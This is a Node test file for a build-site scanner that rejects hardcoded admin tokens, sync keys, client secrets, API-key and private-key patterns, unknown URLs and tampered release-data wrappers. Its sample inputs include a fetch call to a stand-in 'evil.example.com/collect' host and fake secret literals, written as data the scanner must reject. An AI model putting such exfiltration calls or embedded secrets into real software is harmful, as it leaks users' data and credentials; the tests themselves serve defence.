// installer/tests/runtime-source-scan.test.mjs — focused runtime scanner tests (Node built-ins only).
import { test } from 'node:test';
import assert from 'node:assert/strict';
import {
  scanText,
  scanRuntimeSource,
  buildReleaseDataBody,
  parseReleaseDataBody,
  validateGeneratedReleaseData,
} from '../../tools/build-site.mjs';

function makeManifest() {
  return {
    app_version: '1.2.3',
    source_commit: 'a'.repeat(40),
    built_at: '2026-01-02T03:04:05.006Z',
  };
}

function makeHarmlessVerified() {
  return [
    {
      name: 'Auth.gs',
      source:
        'function verifyAdmin_(payload) {\n' +
        '  const adminToken = payload && payload.adminToken;\n' +
        '  return adminToken;\n' +
        '}\n' +
        'function verifyDesktop_(payload) {\n' +
        '  const syncKey = payload && (payload.syncKey || payload.sync_key);\n' +
        '  return syncKey;\n' +
        '}\n',
    },
    {
      name: 'Client.js.html',
      source:
        '<script>\n' +
        'async function loadRooms() {\n' +
        "  const data = await gas('adminRoomsForUi', { adminToken: qs('adminToken').value });\n" +
        '}\n' +
        'function adminFilterPayload() {\n' +
        "  return { adminToken: qs('adminToken').value };\n" +
        '}\n' +
        '</script>\n',
    },
  ];
}

test('harmless representative runtime assignments are accepted by runtime scanner', () => {
  const cases = [
    ['Auth.gs', 'const adminToken = payload && payload.adminToken;'],
    ['Auth.gs', 'const syncKey = payload && (payload.syncKey || payload.sync_key);'],
    ['Client.js.html', "{ adminToken: qs('adminToken').value }"],
    ['Client.js.html', '{ adminToken: qs("adminToken").value }'],
    ['WebApp.html', "adminToken: document.getElementById('adminToken').value,"],
    [
      'Api.gs',
      "const adminToken = (!setting_('admin_token_hash', '') || rotate) ? generateAdminTokenForSetup_(payload) : '(기존 관리자 토큰 유지)';",
    ],
    [
      'Api.gs',
      "const syncKey = (!setting_('sync_key_hash', '') || rotate) ? generateSyncKeyForSetup_(payload) : '(기존 Desktop Sync Key 유지)';",
    ],
    ['Api.gs', 'return { folders: folders, adminToken: adminToken, syncKey: syncKey };'],
  ];
  for (const [rel, snippet] of cases) {
    assert.doesNotThrow(() => scanRuntimeSource(rel, snippet), rel + ': ' + snippet);
  }
});

test('static scan still rejects harmless runtime assignment (documents false positive root cause)', () => {
  assert.throws(() => scanText('release-data.js', 'const adminToken = payload && payload.adminToken;'));
  assert.throws(() => scanText('release-data.js', "{ adminToken: qs('adminToken').value }"));
});

test('hardcoded adminToken/syncKey/client_secret literals are rejected by runtime scanner', () => {
  const evilCases = [
    ['Auth.gs', 'const adminToken = "hardcoded-test-secret";'],
    ['Auth.gs', "const adminToken='hardcoded-test-secret';"],
    ['Client.js.html', '{ adminToken: "hardcoded-test-secret" }'],
    ['Auth.gs', 'const syncKey = "hardcoded-test-sync";'],
    ['Api.gs', '{ syncKey: "hardcoded-test-sync" }'],
    ['Auth.gs', 'const admin_secret = "hardcoded-test-secret";'],
    ['Auth.gs', 'client_secret = "hardcoded-test-value";'],
    ['Auth.gs', 'client_secret: "hardcoded-test-value";'],
    ['Auth.gs', 'CLIENT_SECRET = "hardcoded-test-value";'],
  ];
  for (const [rel, snippet] of evilCases) {
    assert.throws(() => scanRuntimeSource(rel, snippet), 'should reject: ' + snippet);
  }
});

test('escaped JSON-embedded secrets are rejected by runtime scanner', () => {
  const evilSource = 'const adminToken = "evil-hardcoded-123";';
  const embedded = JSON.stringify(evilSource);
  assert.ok(embedded.includes('\\"'));
  assert.throws(() => scanRuntimeSource('release-data.js#Auth.gs', embedded));

  const evilFiles = JSON.stringify([{ name: 'Auth.gs', source: evilSource }]);
  assert.throws(() => scanRuntimeSource('release-data.js', evilFiles));

  const evilClientSecret = JSON.stringify('client_secret = "evil-value";');
  assert.throws(() => scanRuntimeSource('release-data.js#Api.gs', evilClientSecret));
});

test('unknown absolute URLs and source maps are rejected by runtime scanner', () => {
  assert.throws(() => scanRuntimeSource('Client.js.html', 'fetch("https://evil.example.com/collect");'));
  assert.throws(() => scanRuntimeSource('Client.js.html', 'const u = "https://example.com/x";'));
  assert.throws(() => scanRuntimeSource('Client.js.html', '//# sourceMappingURL=app.js.map'));
  assert.throws(() => scanRuntimeSource('Client.js.html', '/*# sourceMappingURL=bundle.js.map */'));
});

test('valid Google runtime scopes pass runtime scanner but full scopes still fail static scan', () => {
  const scopesDoc = JSON.stringify({
    oauthScopes: [
      'https://www.googleapis.com/auth/drive',
      'https://www.googleapis.com/auth/spreadsheets',
      'https://www.googleapis.com/auth/userinfo.email',
    ],
  });
  assert.doesNotThrow(() => scanRuntimeSource('appsscript.json', scopesDoc));
  assert.throws(() => scanText('appsscript.json', 'https://www.googleapis.com/auth/drive'));
  assert.throws(() => scanText('appsscript.json', 'https://www.googleapis.com/auth/spreadsheets'));
});

test('private key / api key / access token patterns are rejected by runtime scanner', () => {
  assert.throws(() =>
    scanRuntimeSource('Auth.gs', 'x = "AIzaSyTestKey1234567890abcdef";')
  );
  assert.throws(() =>
    scanRuntimeSource('Auth.gs', 'x = "ya29.testAccessToken1234567890";')
  );
  assert.throws(() =>
    scanRuntimeSource('Auth.gs', '-----BEGIN PRIVATE KEY-----\nabc')
  );
});

test('fallback literal after safe read is not allowlisted', () => {
  assert.throws(() =>
    scanRuntimeSource('Client.js.html', "{ adminToken: qs('adminToken').value || \"fallback-secret\" }")
  );
  assert.throws(() =>
    scanRuntimeSource('Auth.gs', 'const adminToken = payload && payload.adminToken || "fallback-secret";')
  );
});

test('generated wrapper round-trips and validates', () => {
  const manifest = makeManifest();
  const verified = makeHarmlessVerified();
  const body = buildReleaseDataBody(manifest, verified);
  assert.ok(body.startsWith('// Generated by tools/build-site.mjs. Do not edit.\n'));
  const parsed = parseReleaseDataBody(body);
  assert.equal(parsed.qr.app_version, manifest.app_version);
  assert.equal(parsed.makerRelease, manifest.app_version);
  assert.equal(parsed.runtimeFiles.length, verified.length);
  assert.doesNotThrow(() => validateGeneratedReleaseData(body, manifest, verified));
});

test('wrapper tampering is rejected (trailing code, byte mismatch, malformed)', () => {
  const manifest = makeManifest();
  const verified = makeHarmlessVerified();
  const body = buildReleaseDataBody(manifest, verified);

  assert.throws(() => parseReleaseDataBody('bad header'));
  assert.throws(() => parseReleaseDataBody(body + 'evil();\n'));
  assert.throws(() => validateGeneratedReleaseData(body + 'evil();\n', manifest, verified));
  assert.throws(() =>
    validateGeneratedReleaseData(body.replace('1.2.3', '9.9.9'), manifest, verified)
  );

  const tamperedFiles = [
    { name: 'Auth.gs', source: 'const adminToken = payload && payload.adminToken;' },
  ];
  const tamperedBody = buildReleaseDataBody(manifest, tamperedFiles);
  assert.throws(() => validateGeneratedReleaseData(tamperedBody, manifest, verified));

  const evilVerified = [{ name: 'Auth.gs', source: 'const adminToken = "evil-hardcoded";' }];
  const evilBody = buildReleaseDataBody(manifest, evilVerified);
  assert.throws(() => validateGeneratedReleaseData(evilBody, manifest, evilVerified));
});

test('newline continuations cannot hide hardcoded secret fallbacks', () => {
  assert.throws(() => scanRuntimeSource('Auth.gs', 'const adminToken = payload.adminToken\n || "hardcoded";'));
});

test('runtime scope allowlist rejects prefix lookalikes', () => {
  assert.throws(() => scanRuntimeSource('appsscript.json', '"https://www.googleapis.com/auth/drive.evil"'));
});
